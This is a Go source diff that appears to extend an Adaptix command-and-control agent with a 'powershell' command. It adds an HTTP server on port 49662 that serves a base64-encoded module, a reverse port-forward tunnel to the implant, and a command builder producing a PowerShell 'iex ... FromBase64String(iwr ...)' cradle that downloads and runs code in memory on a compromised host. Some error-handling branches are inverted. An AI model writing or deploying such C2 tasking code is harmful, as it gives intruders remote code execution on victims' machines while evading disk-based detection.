@@ -2,6 +2,7 @@ package main
 
 import (
 	"bytes"
+	"context"
 	"encoding/base64"
 	"encoding/binary"
 	"encoding/hex"
@@ -10,6 +11,7 @@ import (
 	"fmt"
 	"math/rand"
 	"net"
+	"net/http"
 	"os"
 	"os/exec"
 	"sort"
@@ -459,6 +461,40 @@ func PackPivotTasks(pivotId string, data []byte) ([]byte, error) {
 	return PackArray(array)
 }
 
+/// CODE TO SERVE POWERSHELL IMPORTED MODULES
+
+const charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+var g_path = ""
+
+func RandStringBytes(n int) string {
+	b := make([]byte, n)
+	for i := range b {
+		b[i] = charset[rand.Intn(len(charset))]
+	}
+	return string(b)
+}
+
+func ServeFile(module string) {
+	var path = "/" + RandStringBytes(18)
+	g_path = path
+
+	ctx, cancel := context.WithCancel(context.Background())
+
+	http.HandleFunc(g_path, func(w http.ResponseWriter, r *http.Request) {
+		w.Write([]byte(module))
+	})
+
+	go func(ctx context.Context) {
+
+		if err := http.ListenAndServe(":49662", nil); err != nil {
+			cancel()
+		}
+		<-ctx.Done()
+	}(ctx)
+
+	cancel()
+}
+
 func CreateTaskCommandSaveMemory(ts Teamserver, agentId string, buffer []byte) int {
 	chunkSize := 0x100000 // 1Mb
 	memoryId := int(rand.Uint32())
@@ -760,6 +796,64 @@ func CreateTask(ts Teamserver, agent adaptix.AgentData, args map[string]any) (ad
 			goto RET
 		}
 		array = []interface{}{COMMAND_MKDIR, ConvertUTF8toCp(path, agent.ACP)}
+
+	case "powershell":
+		if subcommand == "import" {
+			module, ok := args["module"].(string)
+			if !ok {
+				err = errors.New("parameter 'module' must be set")
+				goto RET
+			}
+
+			taskData.Type = TYPE_TUNNEL
+			tunnelId, err := ts.TsTunnelCreateRportfwd(agent.Id, "", 49662, "127.0.0.1", 49662)
+			if err != nil {
+				taskData.TaskId, err = ts.TsTunnelStart(tunnelId)
+				if err != nil {
+				}
+			} else {
+				ts.TsTunnelStopRportfwd(agent.Id, 49662)
+				tunnelId, err := ts.TsTunnelCreateRportfwd(agent.Id, "", 49662, "127.0.0.1", 49662)
+				if err != nil {
+				}
+				taskData.TaskId, err = ts.TsTunnelStart(tunnelId)
+				if err != nil {
+				}
+			}
+
+			ServeFile(module)
+			taskData.Message = "Importing module"
+			taskData.MessageType = MESSAGE_INFO
+			taskData.ClearText = "\n"
+
+		} else if subcommand == "module" {
+			output := true
+			programState := 0
+			programArgs, ok := args["args"].(string)
+			if ok {
+				programArgs = ConvertUTF8toCp("powershell.exe /c iex([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((iwr http://127.0.0.1:49662"+g_path+" -UseBasicParsing).Content)));"+programArgs, agent.ACP)
+			} else {
+				err = errors.New("parameter 'command' must be set")
+				goto RET
+			}
+
+			array = []interface{}{COMMAND_PS_RUN, output, programState, programArgs}
+		} else if subcommand != "" {
+			output := true
+			programState := 0
+			programArgs, ok := args["args"].(string)
+			if ok {
+				programArgs = ConvertUTF8toCp("powershell.exe /c "+programArgs, agent.ACP)
+			} else {
+				err = errors.New("parameter 'command' must be set")
+				goto RET
+			}
+
+			array = []interface{}{COMMAND_PS_RUN, output, programState, programArgs}
+		} else {
+			err = errors.New("Command not set or subcommand not found. It must be 'import' or 'module'")
+			goto RET
+		}
 
 	case "profile":
 		if subcommand == "download.chunksize" {
